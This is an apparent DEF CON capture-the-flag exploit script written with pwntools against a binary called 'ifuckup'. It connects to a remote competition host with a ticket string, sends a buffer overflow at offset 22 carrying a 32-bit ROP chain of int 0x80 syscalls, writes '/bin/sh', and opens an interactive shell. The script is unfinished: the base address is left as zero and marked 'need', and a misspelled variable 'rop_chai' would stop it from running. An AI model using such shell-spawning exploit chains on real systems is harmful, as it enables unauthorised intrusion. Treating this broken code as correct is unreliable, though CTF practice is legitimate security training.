#!/usr/bin/python2

from pwn import *

exe = ELF("ifuckup")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    elif args.DEFCON:
        r = remote("ifuckup-q5s4htdhw7a6u.shellweplayaga.me", 10001)
        r.sendlineafter(b"Ticket please: ", b"ticket{AtticRenovation5491n23:O0L9SWdzcziYr2OeVtfwLr2s7T8Rk7oRPaIesaZPXGjaB7-P}")
    else:
        r = remote("localhost", 9001)
        #r = remote("addr", 1337)

    return r

r = conn()

sla = lambda a,b : r.sendlineafter("{}".format(a), "{}".format(b))
ru = lambda a : r.recvuntil("{}".format(a))

def send_input(choice, payload=""):
    r.sendline(choice)
    if payload:
        r.sendline(payload)

def main():


    int80_func = 0x102d
    base = 0x0 #need
    pop4_ret = 0x10c4
    bin_sh_off = 0x3730

    #offset at 22 for eip
    rop_chain = b"A"*22
    rop_chain += p32(base + int80_func)
    rop_chain += p32(base + pop4_ret)
    rop_chain += p32(3)
    rop_chain += p32(0)
    rop_chain += p32(base + bin_sh_off)
    rop_chain += p32(11)
    rop_chain += p32(base + int80_func)
    rop_chain += p32(0)
    rop_chai += p32(11) #eax
    rop_chain += p32(base + bin_sh_off) #ebx
    rop_chain += p32(0) #ecx
    rop_chain += p32(0) #edx
    rop_chain += p32(0)*7 + b"\x00\x00" #pad it to fit 100 chars

    r.sendline(rop_chain)
    r.sendline(b"/bin/sh"+p32(0))

    r.interactive()


if __name__ == "__main__":
    main()
